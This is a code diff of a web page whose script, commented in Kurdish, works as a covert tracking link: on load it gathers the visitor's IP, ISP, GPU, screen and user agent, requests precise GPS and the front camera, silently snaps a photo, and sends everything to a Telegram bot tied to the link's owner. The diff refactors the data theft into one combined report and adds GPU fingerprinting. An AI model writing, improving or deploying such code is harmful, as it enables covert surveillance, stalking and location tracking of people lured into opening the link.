@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- ڕێگری لە پاشەکەوتکردنی بیرگەی کۆن (No-Cache) -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
@@ -43,99 +42,120 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
-        function sendTelegramMessage(text) {
-            if (!chatId) return;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(err => console.error(err));
+        // دەستنیشانکردنی GPU
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {}
+            return "نادیار";
         }
 
-        function sendTelegramPhoto(blob) {
+        async function sendTelegramMessage(text) {
+            if (!chatId) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        async function sendTelegramPhoto(blob) {
             if (!chatId) return;
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'capture.jpg');
             formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر لە کامێرای پێشەوە!**');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(err => console.error(err));
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {
+                console.error(err);
+            }
         }
 
-        // 1. زانیاری سەرەتایی IP و مۆبایل
-        async function sendBasicInfo() {
+        async function processVisitor() {
+            if (!chatId) return;
+
+            // 1. وەرگرتنی زانیاری IP
             let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
             } catch (e) {}
 
-            const sysInfo = `
-🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
+            const ip = ipData.ip || 'نادیار';
+            const isp = ipData.org || 'نادیار';
+            const gpu = getGPU();
+            const ratio = window.devicePixelRatio || 1;
+            const resolution = `${window.screen.width}x${window.screen.height} (Ratio:${ratio})`;
 
-🌐 **IP Address:** \`${ipData.ip || 'نادیار'}\`
-🏢 **کۆمپانیای ئینتەرنێت (ISP):** ${ipData.org || 'نادیار'}
+            // 2. وەرگرتنی دۆخی لۆکەیشن
+            let locationText = "";
+            let mapText = "";
 
-📱 **سیستەم:** ${navigator.platform}
-📐 **ڕوونی شاشە:** ${window.screen.width}x${window.screen.height}
-💻 **User-Agent:** ${navigator.userAgent}
-            `;
-            sendTelegramMessage(sysInfo);
-        }
-
-        // 2. پشکنینی دۆخی لۆکەیشن
-        function checkLocation() {
-            if (!("geolocation" in navigator)) {
-                sendTelegramMessage("❌ ئامێرەکە پشتگیری لە Geolocation ناکات.");
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    sendTelegramMessage(`🟢 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**\n🎯 **دۆخی GPS:** لۆکەیشنی ئامێرەکە هەڵکراوە و دەقیقە!\n\n📍 **پۆتانەکان:** \`${lat},${lon}\`\n🗺 [کردنەوە لە Google Maps](${mapLink})`);
-                },
-                (error) => {
-                    if (error.code === 1) { // PERMISSION_DENIED
-                        sendTelegramMessage("🔴 **ڕێگەپێدانی شوێن (Location): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Don't Allow کرد و ڕێگەی نەدا).");
-                    } else if (error.code === 2) { // POSITION_UNAVAILABLE
-                        sendTelegramMessage("🟡 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**\n(کەسەکە Allowی کردووە، بەڵام **Location / GPSی مۆبایلەکەی کوژاوەیە**).");
-                    } else if (error.code === 3) { // TIMEOUT
-                        sendTelegramMessage("⚠️ **شوێن:** کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS.");
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    if (!("geolocation" in navigator)) {
+                        reject({ code: 0 });
                     } else {
-                        sendTelegramMessage("⚠️ **دۆخی شوێن:** هەڵەیەک ڕوویدا لە وەرگرتنی شوێن.");
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 8000,
+                            maximumAge: 0
+                        });
                     }
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        }
+                });
 
-        // 3. پشکنینی دۆخی کامێرا
-        function checkCamera() {
-            if (!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)) {
-                sendTelegramMessage("❌ ئامێرەکە پشتگیری لە کامێرا ناکات.");
-                return;
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                locationText = `🟢 ALLOW کراوە (GPS هەڵکراوە): \`${lat}, ${lon}\``;
+                mapText = `\n🗺 **لینکی نەخشە:** [کردنەوە لە Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+
+            } catch (error) {
+                if (error.code === 1) { // DENY
+                    locationText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
+                } else if (error.code === 2) { // POSITION_UNAVAILABLE
+                    locationText = "🟡 ALLOW کراوە (بەڵام Location / GPSی مۆبایلەکەی داخراوە)";
+                } else if (error.code === 3) { // TIMEOUT
+                    locationText = "⚠️ کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS";
+                } else {
+                    locationText = "❌ ئامێرەکە پشتگیری لۆکەیشن ناکات";
+                }
             }
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then((stream) => {
-                    sendTelegramMessage("🟢 **ڕێگەپێدانی کامێرا (Camera): ALLOW کراوە**\n📸 وێنەکە دەگیرێت...");
+            // 3. وەرگرتنی دۆخی کامێرا
+            let cameraStatusText = "";
+            let imageBlob = null;
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    cameraStatusText = "🟢 ALLOW کراوە (وێنەکە گیرا)";
 
                     const video = document.createElement('video');
                     video.srcObject = stream;
-                    video.play();
+                    await video.play();
 
-                    video.onloadedmetadata = () => {
+                    imageBlob = await new Promise((resolve) => {
                         setTimeout(() => {
                             const canvas = document.createElement('canvas');
                             canvas.width = video.videoWidth || 640;
@@ -144,24 +164,41 @@
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                             canvas.toBlob((blob) => {
-                                sendTelegramPhoto(blob);
                                 stream.getTracks().forEach(track => track.stop());
+                                resolve(blob);
                             }, 'image/jpeg');
                         }, 1000);
-                    };
-                })
-                .catch((err) => {
-                    sendTelegramMessage("🔴 **ڕێگەپێدانی کامێرا (Camera): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Don't Allow کرد و ڕێگەی نەدا).");
-                });
+                    });
+
+                } catch (err) {
+                    cameraStatusText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
+                }
+            } else {
+                cameraStatusText = "❌ ئامێرەکە پشتگیری کامێرا ناکات";
+            }
+
+            // 4. دروستکردن و ناردنی تەنها یەک پەیامی گشتگیر
+            const fullMessage = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
+
+🌐 **IP Address:** \`${ip}\`
+🏢 **کۆمپانیای ئینتەرنێت (ISP):** ${isp}
+🎯 **دۆخی شوێن (GPS):** ${locationText}${mapText}
+📷 **دۆخی کامێرا:** ${cameraStatusText}
+
+📱 **سیستەم:** ${navigator.platform}
+📐 **ڕوونی شاشە:** ${resolution}
+🎮 **GPU:** ${gpu}
+💻 **User-Agent:** \`${navigator.userAgent}\``;
+
+            await sendTelegramMessage(fullMessage);
+
+            // ئەگەر وێنە هەبوو، دوای پەیامەکە دەنێردرێت
+            if (imageBlob) {
+                await sendTelegramPhoto(imageBlob);
+            }
         }
 
-        window.onload = () => {
-            if (chatId) {
-                sendBasicInfo();
-                checkLocation();
-                checkCamera();
-            }
-        };
+        window.onload = processVisitor;
     </script>
 </body>
 </html>
